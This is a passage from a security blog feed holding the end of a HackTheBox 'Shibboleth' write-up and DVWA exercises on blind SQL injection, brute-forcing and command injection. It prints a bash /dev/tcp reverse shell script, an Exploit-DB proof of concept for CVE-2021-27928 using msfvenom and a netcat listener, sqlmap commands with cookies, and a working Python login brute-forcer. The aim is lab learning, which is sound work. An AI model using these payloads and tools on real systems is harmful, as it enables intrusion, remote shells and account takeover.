
<p>Googling more about the service, the site <em>https://book.hacktricks.xyz</em> has some notes on it;</p>

<p><img src="/assets/img/20211114121645.png" alt="" /></p>

<p>Running the metasploit module showed above, I got a hash for a user named <em>Administrator</em>;</p>

<p><img src="/assets/img/20211114121835.png" alt="" /></p>

<p>Feeding the hash to <code class="language-plaintext highlighter-rouge">john</code>, it had no trouble cracking it (<code class="language-plaintext highlighter-rouge">ilovepumkinpie1</code>);</p>

<p><img src="/assets/img/20211114122027.png" alt="" /></p>

<p>Using the password, I was able to login to the <em>Zabbix</em> admin dashboard;</p>

<p><img src="/assets/img/20211114152359.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="foothold">Foothold</h3>
<p><br /></p>

<p>I have never worked with <em>Zabbix</em> before doing this box, so I had to read quite a bit on how it works. It’s basically a monitoring system used to monitor hosts, also referred to as Zabbix agents. In the <em>Zabbix</em> dashboard, there is an agent with the name <em>shibboleth.htb</em>;</p>

<p><img src="/assets/img/20211114161812.png" alt="" /></p>

<p>I learned that an “item”, which contain a “key”, can be added to an agent, and can be used to automate tasks that need to be performed after a defined interval. The key <code class="language-plaintext highlighter-rouge">system.run[]</code> is of interest to me as it can be used to run shell commands on an agent. Going to the <em>items</em> tab, I was given an option to create a key. So I created one that will ping my attack host after every one minute, and setup <code class="language-plaintext highlighter-rouge">tcpdump</code> to look for ICMP packets. It worked;</p>

<p><img src="/assets/img/20211114162432.png" alt="" /></p>

<p><img src="/assets/img/20211114162545.png" alt="" /></p>

<p>After saving the item, I got a callback after a moment;</p>

<p><img src="/assets/img/20211114162714.png" alt="" /></p>

<p>Adding a bash reverse shell in the <code class="language-plaintext highlighter-rouge">system.run[]</code> key works, but exited immediately after the shell has been spawned. I assumed this is because <em>Zabbix</em> is killing the spawned process, so I wrote a bash script named <code class="language-plaintext highlighter-rouge">shell.sh</code> that spawn a bash reverse shell as a background thread, download it on the host using <code class="language-plaintext highlighter-rouge">curl</code> , and execute it (I used the <code class="language-plaintext highlighter-rouge">test</code> button showed when creating an <code class="language-plaintext highlighter-rouge">Item</code> in <em>Zabbix</em> to run the command right away);</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="c"># Spawn the reverse shell in a background thread.</span>
bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.138/443 0&gt;&amp;1 &amp;
<span class="c"># Exit the main thread before Zabbix kills it :)</span>
<span class="nb">exit </span>0
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I got a stable reverse shell after that as the user <code class="language-plaintext highlighter-rouge">zabbix</code>;</p>

<p><img src="/assets/img/20211116172203.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>There is a user account named <code class="language-plaintext highlighter-rouge">ipmi-svc</code> on the host. Testing the password <code class="language-plaintext highlighter-rouge">ilovepumkinpie1</code> (which is the password for the Zabbix administrator) gave me access to the account, and the user flag;</p>

<p><img src="/assets/img/20211116172527.png" alt="" /></p>

<p>The user does not have any sudo access. <code class="language-plaintext highlighter-rouge">netstat</code> showed a MySQL service running locally on the host. So I started going through config files, and found a credential in <code class="language-plaintext highlighter-rouge">/etc/zabbix/zabbix_server.conf</code>;</p>

<p><img src="/assets/img/20211116173102.png" alt="" /></p>

<p>Using the credential, I was able to access the Zabbix database locally, and found <strong>3</strong> hashes in a table named <code class="language-plaintext highlighter-rouge">users</code>;</p>

<p><img src="/assets/img/20211116173407.png" alt="" /></p>

<p>The hash highlighted above is for a password I already have, and the one for the user <code class="language-plaintext highlighter-rouge">Zabbix</code> could not be cracked after <strong>+30</strong> minutes of bruteforce with <code class="language-plaintext highlighter-rouge">john</code>. So I moved on.</p>

<p>Checking the privileges of the <code class="language-plaintext highlighter-rouge">zabbix</code> MySQL user;</p>

<p><img src="/assets/img/20211116174547.png" alt="" /></p>

<p>Version number of MySQL components;</p>

<p><img src="/assets/img/20211116174652.png" alt="" /></p>

<p>Searching the version numbers using <code class="language-plaintext highlighter-rouge">searchsploit</code>, an exploit was found for the entry highlighted above;</p>

<p><img src="/assets/img/20211116175008.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre><span class="c"># Exploit Title: MariaDB 10.2 /MySQL - 'wsrep_provider' OS Command Execution</span>
<span class="c"># Date: 03/18/2021</span>
<span class="c"># Exploit Author: Central InfoSec</span>
<span class="c"># Version: MariaDB 10.2 before 10.2.37, 10.3 before 10.3.28, 10.4 before 10.4.18, and 10.5 before 10.5.9; Percona Server through 2021-03-03; and the wsrep patch through 2021-03-03 for MySQL</span>
<span class="c"># Tested on: Linux</span>
<span class="c"># CVE : CVE-2021-27928</span>

<span class="c"># Proof of Concept:</span>

<span class="c"># Create the reverse shell payload</span>
msfvenom <span class="nt">-p</span> linux/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;ip&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;port&gt; <span class="nt">-f</span> elf-so <span class="nt">-o</span> CVE-2021-27928.so

<span class="c"># Start a listener</span>
nc <span class="nt">-lvp</span> &lt;port&gt;

<span class="c"># Copy the payload to the target machine (In this example, SCP/SSH is used)</span>
scp CVE-2021-27928.so &lt;user&gt;@&lt;ip&gt;:/tmp/CVE-2021-27928.so

<span class="c"># Execute the payload</span>
mysql <span class="nt">-u</span> &lt;user&gt; <span class="nt">-p</span> <span class="nt">-h</span> &lt;ip&gt; <span class="nt">-e</span> <span class="s1">'SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";'</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Using the steps outlined above, I generated an <code class="language-plaintext highlighter-rouge">elf</code> reverse shell, download it on the host using <code class="language-plaintext highlighter-rouge">wget</code>, and exploit the flaw to gain root access to the box;</p>

<p><img src="/assets/img/20211116175800.png" alt="" /></p>

<p><img src="/assets/img/20211116175822.png" alt="" /></p>

<p><img src="/assets/img/20211116175839.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Identified a web service on the host on port <strong>80</strong> using <code class="language-plaintext highlighter-rouge">nmap</code></li>
  <li>Found <em>Zabbix</em> installation on the host by bruteforcing with <code class="language-plaintext highlighter-rouge">ffuf</code></li>
  <li>Identified an <code class="language-plaintext highlighter-rouge">asf-rmcp</code> service running on UDP port <strong>623</strong></li>
  <li>Used <code class="language-plaintext highlighter-rouge">auxiliary/scanner/ipmi/ipmi_dumphashes</code> metasploit module, and obtained the password hash of the user <code class="language-plaintext highlighter-rouge">Administrator</code>. Cracking it gave me access to the admin dashboard of Zabbix.</li>
  <li>Inside <em>Zabbix</em> dashboard;
    <ul>
      <li>Found a Zabbix agent with the name <code class="language-plaintext highlighter-rouge">shibboleth.htb</code></li>
      <li>Spawned a shell on it using <code class="language-plaintext highlighter-rouge">system.run[]</code> <em>Item</em> key, which gave me access to the box as <code class="language-plaintext highlighter-rouge">zabbix</code> user.</li>
    </ul>
  </li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">zabbix</code>;
    <ul>
      <li>Identified a local user account with the username <code class="language-plaintext highlighter-rouge">ipmi-svc</code>.</li>
      <li>Gained access to the account due to password reuse.</li>
    </ul>
  </li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">ipmi-svc</code>;
    <ul>
      <li>Found a credential for the local MySQL service used by the Zabbix installation.</li>
      <li>Identified a vulnerable component used by the server.</li>
      <li>Found an exploit using <code class="language-plaintext highlighter-rouge">searchsploit</code>, which gave me root access to the box.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="zabbix" /><category term="udp" /><category term="ipmi" /><category term="mysql" /><category term="wsrep" /><category term="metasploit" /><category term="asf-rmcp" /><summary type="html"><![CDATA[Shibboleth is a relatively easy medium linux box. It’s running an instance of Zabbix which you can identify by bruteforcing for hidden subdomains. Once discovered, you need to exploit an ASF-RMCP/IPMI service running on UDP port 623 to extract and crack the hash of an administrator, which will give you access to the Zabbix dashboard. The box itself is configured as a Zabbix agent, so you can use this to gain code execution. Once inside, you will be moving laterally to another user through password reuse, and gain root access to the box thanks to a vulnerable MySQL service.]]></summary></entry><entry><title type="html">Blind SQL Injection- DVWA</title><link href="https://4g3nt47.github.io/posts/dvwa/dvwa_blind_sqli.html" rel="alternate" type="text/html" title="Blind SQL Injection- DVWA" /><published>2022-03-27T00:00:00+01:00</published><updated>2022-03-27T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/dvwa/dvwa_blind_sqli</id><content type="html" xml:base="https://4g3nt47.github.io/posts/dvwa/dvwa_blind_sqli.html"><![CDATA[<p>This is an exercise in OWASP DVWA for exploiting blind SQL injection.</p>

<p><br /></p>

<h3 id="blind-sql-injection---dvwa">Blind SQL Injection - DVWA</h3>
<p><br /></p>

<h4 id="difficulty-easy">Difficulty: Easy</h4>
<p><br /></p>

<p>In this mode, we are given a simple form that checks if a user exists with the given ID;</p>

<p><img src="/assets/img/20220327082816.png" alt="" /></p>

<p>When given an invalid user ID, the application respond with this;</p>

<p><img src="/assets/img/20220327083013.png" alt="" /></p>

<p>The application appears to be vulnerable to <em>blind SQL injection</em> because injecting an SQL query that will always evaluate to true gave a positive output;</p>

<p><img src="/assets/img/20220327083207.png" alt="" /></p>

<p>Blind injections are a pain to exploit manually, so I called in <code class="language-plaintext highlighter-rouge">sqlmap</code>;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="s1">'http://buster/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit'</span> <span class="nt">-p</span> <span class="nb">id</span> <span class="nt">--cookie</span> <span class="s1">'security=low; PHPSESSID=5c8siun1tr567gd519v1mivcbi'</span> <span class="nt">--dbs</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/20220327083557.png" alt="" /></p>

<p>Tables in <code class="language-plaintext highlighter-rouge">dvwa</code> database;</p>

<p><img src="/assets/img/20220327083621.png" alt="" /></p>

<p>Contents of <code class="language-plaintext highlighter-rouge">users</code> table;</p>

<p><img src="/assets/img/20220327083912.png" alt="" /></p>

<p>Blind SQL injections can be pretty slow, even with <code class="language-plaintext highlighter-rouge">sqlmap</code>. You can speed up the process by increasing the number of threads using the <code class="language-plaintext highlighter-rouge">--threads</code> argument, but this could easily corrupt the data being dumped when <code class="language-plaintext highlighter-rouge">sqlmap</code> is using a <em>time delay</em> technique in an unstable connection.</p>

<p><br /></p>

<h4 id="difficulty-medium">Difficulty: Medium</h4>
<p><br /></p>

<p>In this mode, we get a different form where the inputs are predefined in the form;</p>

<p><img src="/assets/img/20220327084414.png" alt="" /></p>

<p>The challenges are looking similar to the ones in error-based SQL injection section. Using a proxy and injecting an SQL query that always evaluate to true gives a positive result, indicating the application is vulnerable;</p>

<p><img src="/assets/img/20220327084936.png" alt="" /></p>

<p><img src="/assets/img/20220327085000.png" alt="" /></p>

<p>This is exploitable using <code class="language-plaintext highlighter-rouge">sqlmap</code>;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="s1">'http://buster/dvwa/vulnerabilities/sqli_blind/'</span> <span class="nt">--data</span> <span class="s1">'id=1&amp;Submit=Submit'</span> <span class="nt">--cookie</span> <span class="s1">'security=medium; PHPSESSID=5c8siun1tr567gd519v1mivcbi'</span> <span class="nt">-p</span> <span class="nb">id</span> <span class="nt">--dbs</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/20220327085253.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-high">Difficulty: High</h4>
<p><br /></p>

<p>This mode is also similar to the <em>high difficulty</em> level of the error-based SQL injection challenge. Only difference is this one is blind;</p>

<p><img src="/assets/img/20220327085544.png" alt="" /></p>]]></content><author><name></name></author><category term="dvwa" /><category term="dvwa" /><category term="sql injection" /><category term="sqlmap" /><summary type="html"><![CDATA[This is an exercise in OWASP DVWA for exploiting blind SQL injection.]]></summary></entry><entry><title type="html">Bruteforce - DVWA</title><link href="https://4g3nt47.github.io/posts/dvwa/dvwa_bruteforce.html" rel="alternate" type="text/html" title="Bruteforce - DVWA" /><published>2022-03-27T00:00:00+01:00</published><updated>2022-03-27T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/dvwa/dvwa_bruteforce</id><content type="html" xml:base="https://4g3nt47.github.io/posts/dvwa/dvwa_bruteforce.html"><![CDATA[<p>This is an exercise in OWASP DVWA on login bruteforcing.</p>

<p><br /></p>

<h3 id="bruteforce---dvwa">Bruteforce - DVWA</h3>
<p><br /></p>

<h4 id="difficulty-easy">Difficulty: Easy</h4>
<p><br /></p>

<p>In this mode, we were presented with a login form;</p>

<p><img src="/assets/img/20220323102403.png" alt="" /></p>

<p>The form is submitted in a GET request with not CSRF tokens;</p>

<p><img src="/assets/img/20220323102539.png" alt="" /></p>

<p>This was a piece of cake to bruteforce using <code class="language-plaintext highlighter-rouge">ffuf</code>. All we had to do is get our session cookie for the application since the form is only accessible by logged in users, and filter out the login error message, which is <code class="language-plaintext highlighter-rouge">Username and/or password incorrect</code>;</p>

<p><img src="/assets/img/20220323102823.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-medium">Difficulty: Medium</h4>
<p><br /></p>

<p>We get the same login form, and it’s also submitted in a POST request. The only difference I can see is the delay in response by the server. This will slow down bruteforce attacks. Using <code class="language-plaintext highlighter-rouge">ffuf</code> to bruteforce the login showed some errors, and eventually the whole application appears to hang, even when requesting other pages. However, this delay appears to be tied only to the session cookie I’m using to do the bruteforce because no such delay was observed in another session.</p>

<p><img src="/assets/img/20220323110648.png" alt="" /></p>

<p>The bruteforce succeded after forcing <code class="language-plaintext highlighter-rouge">ffuf</code> to only use a single thread, which is slow;</p>

<p><img src="/assets/img/20220323111121.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-high">Difficulty: High</h4>
<p><br /></p>

<p>In this mode, we get a similar login form again, but with a CSRF token;</p>

<p><img src="/assets/img/20220323111507.png" alt="" /></p>

<p>Altering the CSRF token showed that it’s being validated by the web application;</p>

<p><img src="/assets/img/20220323111729.png" alt="" /></p>

<table>
  <tbody>
    <tr>
      <td>This means we need to account for this during our bruteforce. Earlier, we [[Initial Access#Making a Bruteforcer</td>
      <td>made something similar]] for bruteforcing the main login page of DVWA.</td>
    </tr>
  </tbody>
</table>

<p>This time, we are going to do something similar, but a little bit more advance. We will make the program multi-threaded.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
#------------------------------------------------------------------
# A bruteforcer for DVWA's bruteforce challenge 3 (high difficulty)
#                                 Author: https://4g3nt47.github.io
#------------------------------------------------------------------
</span>
<span class="kn">import</span> <span class="nn">os</span><span class="p">,</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">threading</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="kn">from</span> <span class="nn">queue</span> <span class="kn">import</span> <span class="n">Queue</span>

<span class="k">class</span> <span class="nc">l3_bruteforcer</span><span class="p">:</span>

  <span class="c1"># The class initializer.
</span>  <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">cookies</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">wordlist</span><span class="p">,</span> <span class="n">threads</span><span class="p">):</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">messages</span> <span class="o">=</span> <span class="n">Queue</span><span class="p">()</span> <span class="c1"># Used to queue outputs by threads.
</span>    <span class="bp">self</span><span class="p">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">url</span>
    <span class="c1"># Parse the cookie string (e.g "user=someUser; priv=somePriv"), there is probably a better way to do this :)
</span>    <span class="n">data</span> <span class="o">=</span> <span class="n">cookies</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"; "</span><span class="p">)</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">cookies</span> <span class="o">=</span> <span class="p">{}</span>
    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
      <span class="bp">self</span><span class="p">.</span><span class="n">cookies</span><span class="p">[</span><span class="n">line</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"="</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">strip</span><span class="p">()]</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"="</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">strip</span><span class="p">()</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">username</span> <span class="o">=</span> <span class="n">username</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">wordlist</span> <span class="o">=</span> <span class="n">wordlist</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">threads</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span> <span class="k">if</span> <span class="n">threads</span> <span class="o">&lt;</span> <span class="mi">1</span> <span class="k">else</span> <span class="n">threads</span><span class="p">)</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">abort</span> <span class="o">=</span> <span class="bp">False</span>

  <span class="c1"># Called when starting the bruteforce. Dispatches all threads.
</span>  <span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
    <span class="c1"># Load the wordlist into a Queue object
</span>    <span class="k">print</span><span class="p">(</span><span class="s">"[*] Loading wordlist..."</span><span class="p">);</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">words</span> <span class="o">=</span> <span class="n">Queue</span><span class="p">()</span>
    <span class="n">rfo</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">wordlist</span><span class="p">)</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
      <span class="n">line</span> <span class="o">=</span> <span class="n">rfo</span><span class="p">.</span><span class="n">readline</span><span class="p">()</span>
      <span class="k">if</span> <span class="ow">not</span> <span class="n">line</span><span class="p">:</span> <span class="k">break</span> <span class="c1"># List exhausted
</span>      <span class="bp">self</span><span class="p">.</span><span class="n">words</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="n">line</span><span class="p">.</span><span class="n">strip</span><span class="p">())</span>
    <span class="c1"># Start the threads.
</span>    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[*] Starting </span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">threads</span><span class="si">}</span><span class="s"> threads..."</span><span class="p">);</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">threads</span><span class="p">):</span>
      <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">brute</span><span class="p">)</span>
      <span class="n">t</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
    <span class="c1"># Loop and print logs.
</span>    <span class="k">while</span> <span class="bp">self</span><span class="p">.</span><span class="n">words</span><span class="p">.</span><span class="n">empty</span><span class="p">()</span> <span class="o">==</span> <span class="bp">False</span> <span class="ow">and</span> <span class="bp">self</span><span class="p">.</span><span class="n">abort</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
      <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
      <span class="k">while</span> <span class="ow">not</span> <span class="bp">self</span><span class="p">.</span><span class="n">messages</span><span class="p">.</span><span class="n">empty</span><span class="p">():</span>
        <span class="k">print</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">messages</span><span class="p">.</span><span class="n">get</span><span class="p">())</span>

  <span class="c1"># The thread function.
</span>  <span class="k">def</span> <span class="nf">brute</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
    <span class="k">while</span> <span class="ow">not</span> <span class="bp">self</span><span class="p">.</span><span class="n">abort</span><span class="p">:</span>
      <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">words</span><span class="p">.</span><span class="n">empty</span><span class="p">():</span>
        <span class="k">break</span>
      <span class="n">password</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">words</span><span class="p">.</span><span class="n">get</span><span class="p">()</span>
      <span class="c1"># Fetch the token.
</span>      <span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
      <span class="n">body</span> <span class="o">=</span> <span class="n">sess</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">cookies</span><span class="p">).</span><span class="n">content</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span>
    <span class="c1"># No need for regular expressions when you can just split and index your way to glory!!!
</span>      <span class="n">token</span> <span class="o">=</span> <span class="n">body</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"name='user_token' value='"</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">"'"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">strip</span><span class="p">()</span>
      <span class="c1"># Attempt to login
</span>      <span class="bp">self</span><span class="p">.</span><span class="n">messages</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="sa">f</span><span class="s">"[*] Trying </span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">username</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
      <span class="n">body</span> <span class="o">=</span> <span class="n">sess</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">url</span> <span class="o">+</span> <span class="sa">f</span><span class="s">"?username=</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">username</span><span class="si">}</span><span class="s">&amp;password=</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s">&amp;user_token=</span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s">&amp;Login=Login"</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">cookies</span><span class="p">).</span><span class="n">content</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span>
      <span class="k">if</span> <span class="ow">not</span> <span class="s">"Username and/or password incorrect"</span> <span class="ow">in</span> <span class="n">body</span><span class="p">:</span> <span class="c1"># Login successful???
</span>        <span class="bp">self</span><span class="p">.</span><span class="n">messages</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Authentiation successful: </span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">username</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">abort</span> <span class="o">=</span> <span class="bp">True</span> <span class="c1"># Signals other threads to quit.
</span>        <span class="k">break</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">6</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[-] Usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;url&gt; &lt;cookie&gt; &lt;username&gt; &lt;wordlist&gt; &lt;threads&gt;"</span><span class="p">)</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
  <span class="n">bruteforcer</span> <span class="o">=</span> <span class="n">l3_bruteforcer</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">5</span><span class="p">]))</span>
  <span class="n">bruteforcer</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Testing this with number of threads set to <code class="language-plaintext highlighter-rouge">1</code> worked;</p>

<p><img src="/assets/img/20220323121335.png" alt="" /></p>

<p>Setting the value of threads to more than <code class="language-plaintext highlighter-rouge">1</code> however, gave a false positive;</p>

<p><img src="/assets/img/20220323121547.png" alt="" /></p>

<p>Running the requests through a proxy, the threading appears to be messing up the CSRF token validation;</p>

<p><img src="/assets/img/20220323121801.png" alt="" /></p>

<p>This is likely because the token is tied to the session of a user, so by the time a token is issued for a request in one thread, other tokens issued to other threads will be invalidated. This makes the multi-threading feature added to the code completely useless :(</p>

<p><img src="/assets/img/20220327093554.png" alt="" /></p>]]></content><author><name></name></author><category term="dvwa" /><category term="dvwa" /><category term="ffuf" /><category term="bruteforce" /><category term="python" /><summary type="html"><![CDATA[This is an exercise in OWASP DVWA on login bruteforcing.]]></summary></entry><entry><title type="html">Command Injection - DVWA</title><link href="https://4g3nt47.github.io/posts/dvwa/dvwa_command_injection.html" rel="alternate" type="text/html" title="Command Injection - DVWA" /><published>2022-03-27T00:00:00+01:00</published><updated>2022-03-27T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/dvwa/dvwa_command_injection</id><content type="html" xml:base="https://4g3nt47.github.io/posts/dvwa/dvwa_command_injection.html"><![CDATA[<p>This is an exercise in OWASP DVWA for <em>command injection</em>.</p>

<p><br /></p>

<h3 id="command-injection---dvwa">Command Injection - DVWA</h3>
<p><br /></p>

<h4 id="difficulty-easy">Difficulty: Easy</h4>
<p><br /></p>

<p>This mode gave us an input field for an IP address. Following submission, and a short delay, some output that look to be the result of the <code class="language-plaintext highlighter-rouge">ping</code> command was displayed;</p>

<p><img src="/assets/img/20220323175128.png" alt="" /></p>

<p>The user input is submitted in a POST request;</p>

<p><img src="/assets/img/20220323175239.png" alt="" /></p>

<p>Since we do know our instance of DVWA is running on a linux host, we were able to inject code into the command by using a semi colon, which act as a command separator;</p>

<p><img src="/assets/img/20220323175709.png" alt="" /></p>

<p>I was able to spawn a shell on the box using a base64-encoded bash reverse shell;</p>

<p><img src="/assets/img/20220323180023.png" alt="" /></p>

<p><img src="/assets/img/20220323180043.png" alt="" /></p>

<p><img src="/assets/img/20220323180124.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-medium">Difficulty: Medium</h4>
<p><br /></p>

<p>In this mode, we are presented with the same form again;</p>

<p><img src="/assets/img/20220323180426.png" alt="" /></p>

<p>Using <code class="language-plaintext highlighter-rouge">;</code> to inject commands simply hung the application for few secods, before returning blank result. Testing for other methods of command injection, we were able to inject code using a double pipe (<code class="language-plaintext highlighter-rouge">||</code>), which is used to execute a command if the previous command in the chain has failed;</p>

<p><img src="/assets/img/20220323180953.png" alt="" /></p>

<p>This injection can also be used to spawn a shell on the box;</p>

<p><img src="/assets/img/20220323181229.png" alt="" /></p>

<p><img src="/assets/img/20220323181249.png" alt="" /></p>

<p>Command injection using conditional operators like <code class="language-plaintext highlighter-rouge">||</code> is not ideal because they depend on the exit code of the primary command you are injecting into.  So I tried wrapping the injected command in backticks, which will take precedence over the primary command because it’s output will be used to construct the primary command, and it worked;</p>

<p><img src="/assets/img/20220323181652.png" alt="" /></p>

<p><img src="/assets/img/20220323181711.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-high">Difficulty: High</h4>
<p><br /></p>

<p>We got the same form again in this mode;</p>

<p><img src="/assets/img/20220323181932.png" alt="" /></p>

<p>Command injection using <code class="language-plaintext highlighter-rouge">||</code> works;</p>

